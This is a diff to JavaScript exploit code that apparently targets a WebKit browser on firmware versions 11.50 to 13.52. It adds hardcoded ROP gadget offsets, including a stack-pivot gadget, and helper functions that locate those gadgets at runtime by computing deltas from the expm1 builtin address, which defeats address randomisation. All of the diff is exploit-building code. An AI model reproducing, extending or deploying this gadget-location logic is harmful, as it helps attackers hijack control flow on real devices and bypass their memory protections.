@@ -32,6 +32,21 @@ export const G5_DELTA_FROM_G0 = 0x15d362;
 /** G5 − expm1 — stable on 13.00/13.52 (HW G5 @ expm1+this on 13.52) */
 export const G5_EXPM1_DELTA = 0x53642a;
 
+/** G0 − expm1 — stable 13.00→13.52 (13.00 G0 @ 0x295f948, expm1 @ 0x2586880) */
+export const G0_EXPM1_DELTA = 0x3d90c8;
+
+const EXPM1_1300 = 0x2586880;
+
+/** Signed expm1 deltas from 13.00 poops row — same method as G5_EXPM1_DELTA. */
+export const PIVOT_EXPM1_DELTA = {
+    wk_MOV_RDI_RSI_30_CALL:       G0_EXPM1_DELTA,
+    wk_POP_RAX_MOV_RAX_JMP_18:    0x1d989e3 - EXPM1_1300,
+    wk_PUSH_RBP_MOV_RBP_RSP_10:   0x25bae0 - EXPM1_1300,
+    wk_MOV_RDI_RAX_8_CALL_20:     0x4a0406 - EXPM1_1300,
+    wk_MOV_RDX_RAX_18_CALL_10:    0x1ec3ada - EXPM1_1300,
+    wk_PUSH_RDX_POP_RSP_RET:      G5_EXPM1_DELTA,
+};
+
 export const WEBKIT_RVA_PAD = 0x100000;
 export const WEBKIT_RVA_PROBE_KEY = "wk-rva-max";
 
@@ -80,9 +95,42 @@ export function g5RvaSafe(rva, off) {
 }
 
 export function g5Expm1Hint(off) {
+    return pivotExpm1HintFor("wk_PUSH_RDX_POP_RSP_RET", off);
+}
+
+/** expm1 + stable 13.00 delta — how G5 @ +0x13ec77a was found on 13.52 HW. */
+export function pivotExpm1HintFor(key, off) {
     const e = off && off.wk_expm1_builtin;
     if (!e) return 0;
-    return e + G5_EXPM1_DELTA;
+    const d = PIVOT_EXPM1_DELTA[key];
+    if (d == null) return 0;
+    const rva = (e + d) | 0;
+    if (rva < 0x10000 || rva >= 0x4000000) return 0;
+    return rva;
+}
+
+/** G0 from confirmed G5 — G5−G0 stable @ 0x15d362 across 11.50–13.52 modules. */
+export function pivotG0FromG5(g5rva) {
+    if (g5rva == null || g5rva < 0x10000) return 0;
+    const rva = (g5rva - G5_DELTA_FROM_G0) | 0;
+    if (rva < 0x10000) return 0;
+    return rva;
+}
+
+/** Best probe hint: G5−Δ for G0, else expm1+delta, else HW/low prefix table. */
+export function pivotProbeHint(key, off, found) {
+    if (key === "wk_MOV_RDI_RSI_30_CALL") {
+        const g5 = (found && found.wk_PUSH_RDX_POP_RSP_RET != null)
+            ? found.wk_PUSH_RDX_POP_RSP_RET
+            : (off && off.wk_PUSH_RDX_POP_RSP_RET);
+        const fromG5 = pivotG0FromG5(g5);
+        if (fromG5 > 0) return fromG5;
+    }
+    const exp = pivotExpm1HintFor(key, off || found);
+    if (exp > 0) return exp;
+    if (off && off[key] != null) return off[key];
+    if (found && found[key] != null) return found[key];
+    return pivotHint(key);
 }
 
 export function g5DerivedHint(found) {
@@ -108,6 +156,15 @@ export function pivotScanHint(key, found, scanMax, off) {
         if (expm1 > 0 && expm1 < scanMax) return expm1;
         const derived = g5DerivedHint(found);
         if (derived > 0 && derived < scanMax) return derived;
+    }
+    if (key === "wk_MOV_RDI_RSI_30_CALL") {
+        const g5 = (found && found.wk_PUSH_RDX_POP_RSP_RET != null)
+            ? found.wk_PUSH_RDX_POP_RSP_RET
+            : (off && off.wk_PUSH_RDX_POP_RSP_RET);
+        const fromG5 = pivotG0FromG5(g5);
+        if (fromG5 > 0 && fromG5 < scanMax) return fromG5;
+        const expG0 = pivotExpm1HintFor(key, off || found);
+        if (expG0 > 0 && expG0 < scanMax) return expG0;
     }
     const table = pivotHint(key);
     if (table > 0 && table < scanMax) return table;
